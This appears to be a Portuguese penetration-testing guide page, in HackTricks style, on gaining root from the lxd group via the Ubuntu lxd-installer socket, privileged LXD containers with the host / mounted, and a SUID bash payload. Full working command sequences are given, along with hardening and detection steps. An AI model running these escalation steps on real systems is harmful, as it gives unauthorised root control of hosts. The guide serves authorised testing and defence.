# lxd/lxc Group - Escalação de privilégios

{{#include ../../../banners/hacktricks-training.md}}

A associação ao grupo de gerenciamento LXD do host (normalmente _**lxd**_) pode fornecer um caminho para obter root, permitindo controle total do daemon.<sup>[[1]](#references)</sup> Esse é o mesmo problema de limite de confiança descrito para [sockets de controle de runtime](../../containers-namespaces/container-security/runtime-api-and-daemon-exposure.md) e [montagens de host graváveis](../../containers-namespaces/container-security/sensitive-host-mounts.md): o acesso à API de gerenciamento pode ser suficiente mesmo quando o processo atual ainda não está dentro de um container.<sup>[[1]](#references)</sup>

## Ativação por socket do Ubuntu `lxd-installer`

Não presuma que a associação ao grupo `lxd` é inofensiva apenas porque o snap do LXD está ausente. No Ubuntu Server 24.04 e posteriores, o pacote `lxd-installer` incluído por padrão expõe `/run/lxd-installer.socket` como `root:lxd` com modo `0660`. Uma conexão ativa `lxd-installer@.service` como root, que instala o snap do LXD sem senha de sudo ou autorização do polkit; algumas versões do wrapper também omitem a solicitação de confirmação quando a entrada padrão não é um TTY.<sup>[[10]](#references)[[11]](#references)</sup>

Inspecione a associação da conta e o serviço ativado por socket:<sup>[[10]](#references)[[11]](#references)</sup>

```bash
id -nG
getent group lxd
stat -c '%A %U:%G %n' /run/lxd-installer.socket
systemctl cat lxd-installer.socket lxd-installer@.service
```

Um teste autorizado do grupo `lxd` pode ativar o instalador por meio do wrapper normal `lxc` ou conectando-se diretamente ao socket. A segunda opção mostra que a ACL do socket Unix, e não o prompt do wrapper, é o verdadeiro limite de autorização:<sup>[[10]](#references)[[11]](#references)</sup>

```bash
python3 -c 'import socket; s=socket.socket(socket.AF_UNIX); s.connect("/run/lxd-installer.socket"); s.send(b"x"); s.recv(1)'
lxc version
```

Once o daemon estiver disponível, continue com as técnicas de containers privilegiados abaixo.<sup>[[10]](#references)[[11]](#references)</sup>

## Explorando sem internet

### Método 1

Você pode baixar uma imagem Alpine de um repositório confiável para usar com o LXD.
O servidor de imagens do LXD da Canonical publica builds diários: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
Basta baixar **lxd.tar.xz** e **rootfs.squashfs** do build mais recente (o nome do diretório é a data).<sup>[[8]](#references)</sup>

Como alternativa, você pode instalar o distrobuilder na sua máquina seguindo as [instruções do projeto](https://github.com/lxc/distrobuilder).<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>

```bash
# Install requirements
sudo apt update
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage    

# Clone repo
mkdir -p $HOME/go/src/github.com/lxc/
cd $HOME/go/src/github.com/lxc/
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd ./distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container - Beware of architecture while compiling locally.
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
```

Faça upload de **incus.tar.xz** (**lxd.tar.xz** se você baixou do servidor de imagens da Canonical) e **rootfs.squashfs**, depois importe a imagem e crie um contêiner.<sup>[[2]](#references)[[3]](#references)[[5]](#references)[[8]](#references)[[9]](#references)</sup>

```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

> [!CAUTION]
> Se encontrar este erro _**Erro: Nenhum pool de armazenamento encontrado. Crie um novo pool de armazenamento**_\
> Execute **`lxd init`**, configure um pool de armazenamento padrão e, em seguida, **repita** o bloco de comandos anterior.<sup>[[2]](#references)</sup>

Por fim, inicie o container e abra um shell root no sistema de arquivos do host:<sup>[[1]](#references)[[2]](#references)</sup>

```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```

Como o UID 0 nesta instância privilegiada não é remapeado, ele pode criar um payload SUID pertencente ao host por meio da raiz do host montada. Isso conclui o pivot do container para o host, em vez de deixar o operador em um shell do container:<sup>[[10]](#references)[[11]](#references)</sup>

```bash
# From the host, write the payload through the privileged container
lxc exec privesc -- /bin/sh -c 'cp /mnt/root/bin/bash /mnt/root/rootbash && chmod 4755 /mnt/root/rootbash'

# Execute on the host; -p prevents bash from dropping the SUID-derived EUID
/rootbash -p
id
```

Coloque o payload em um sistema de arquivos que respeite SUID. Um `/tmp` separado costuma ser montado com `nosuid` e talvez não apareça em uma montagem bind não recursiva do `/` do host, então um caminho como `/rootbash` no sistema de arquivos raiz do host é mais confiável para essa demonstração.<sup>[[10]](#references)[[11]](#references)</sup>

### Method 2

Crie uma imagem Alpine e inicie-a com a flag `security.privileged=true`, que mapeia o root do container para o root do host; montar `/` expõe o sistema de arquivos do host dentro do container.<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>

```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```

## Efeito colateral em todo o host no AppArmor

Iniciar o snap do LXD também pode gravar `/run/sysctl.d/zz-lxd.conf` e definir `kernel.apparmor_restrict_unprivileged_userns` e `kernel.apparmor_restrict_unprivileged_unconfined` como `0`. Isso enfraquece as restrições do Ubuntu para user namespaces sem privilégios para todos os usuários locais; por isso, registre os valores antes e depois de ativar o LXD ao avaliar o host.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
cat /run/sysctl.d/zz-lxd.conf 2>/dev/null
sysctl kernel.apparmor_restrict_unprivileged_userns \
       kernel.apparmor_restrict_unprivileged_unconfined
```

## Auditoria e hardening

Trate a associação ao grupo `lxd` como uma concessão de acesso root. Remover um membro desnecessário só surte efeito em novas sessões de login; remover completamente `lxd-installer` ou mascarar seu socket apenas remove o caminho de instalação sob demanda e **não** restringe um usuário que já consegue acessar um daemon LXD instalado.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
getent group lxd
sudo gpasswd -d <user> lxd

# Only if on-demand LXD installation is not required
sudo systemctl mask --now lxd-installer.socket
# or: sudo apt purge lxd-installer
```

Indicadores úteis de comprometimento incluem instâncias LXD com `security.privileged=true`, dispositivos de disco cujo `source` é `/`, conexões inesperadas a `/run/lxd-installer.socket`, novos arquivos SUID e uma alteração dos sysctls do AppArmor acima de `1` para `0`.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
lxc list
lxc config show <instance> --expanded
find / -xdev -type f -perm -4000 2>/dev/null
```

## References

- [1] [Como reforçar a segurança do LXD](https://canonical.com/lxd/docs/latest/howto/security_harden/)
- [2] [Contêineres e máquinas virtuais LXD](https://ubuntu.com/server/docs/how-to/virtualisation/lxd/)
- [3] [Como copiar e importar imagens](https://canonical.com/lxd/docs/latest/howto/images_copy/)
- [4] [distrobuilder](https://github.com/lxc/distrobuilder)
- [5] [Como compilar imagens com distrobuilder](https://github.com/lxc/distrobuilder/blob/main/doc/howto/build.md)
- [6] [Definição da imagem Alpine](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
- [7] [Script de compilação do lxd-alpine-builder](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
- [8] [Servidor de imagens do LXD](https://images.lxd.canonical.com/)
- [9] [Tipo: disco](https://canonical.com/lxd/docs/latest/reference/devices_disk/)
- [10] [Relatório e PoC da STAR Labs sobre escalonamento de privilégios pelo grupo LXD](https://github.com/star-sg/lxd-group-privesc-report)
- [11] [Vinho velho em garrafa nova: o grupo LXD rearmado para obter root após uma década](https://starlabs.sg/blog/2026/06-old-wine-in-a-new-bottle-a-decade-old-lxd-group-root-re-armed)
{{#include ../../../banners/hacktricks-training.md}}
